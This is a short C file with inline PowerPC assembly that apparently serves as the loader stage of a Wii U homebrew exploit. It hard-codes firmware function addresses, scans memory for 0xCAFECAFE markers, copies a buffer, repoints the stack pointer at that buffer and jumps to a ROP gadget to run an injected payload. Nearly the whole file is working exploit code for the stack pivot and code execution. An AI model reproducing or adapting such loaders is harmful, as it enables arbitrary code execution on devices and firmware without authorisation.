#define OSDynLoad_Acquire ((void (*)(char* rpl, unsigned int *handle))0x1026e60)
#define OSDynLoad_FindExport ((void (*)(unsigned int handle, int isdata, char *symbol, void *address))0x1028460)
#define OSFatal ((void (*)(char* msg))0x0102D01C)
#define __os_snprintf ((int(*)(char* s, int n, const char * format, ... ))0x102b9ac)
#define rop ((void (*)())0x0E0D595C)
#define memcpy ((void * (*)(void * destination, const void * source, int num))0x01030ee4)

#define BUFFER_ADDR 0x1dd7b814
#define CODE_START	0xCAFECAFE

void start()
{
    asm("stwu %r1,-0x2000(%r1)");
    unsigned int * start = (unsigned int*)BUFFER_ADDR;
    int i;
  
    for (i = 0; i < 150; start += 1) {
        if (*start == CODE_START) i++;
    }
    
    memcpy((void *)BUFFER_ADDR, (void *)BUFFER_ADDR + 0x800, 0x600);
    
    unsigned int * code_addr = (unsigned int *)(BUFFER_ADDR + 0x94);
    //unsigned int * jump_addr = (unsigned int *)(BUFFER_ADDR + 0x19C);
    //unsigned int * jump_memcpy = (unsigned int *)(BUFFER_ADDR + 0x540);
    *code_addr = (int)start;
    //*jump_memcpy = 0;
    //*jump_addr = 0x0102D01C;

    asm(
        "lis %r1, 0x1dd7 ;"
        "ori %r1, %r1, 0xb814 ;"
    );
    rop();

     /* Debug printing */
     //char msg[255];
     //__os_snprintf(msg, 255, "0x%08x 0x%08x", *code_addr, start);
     //OSFatal(msg);
}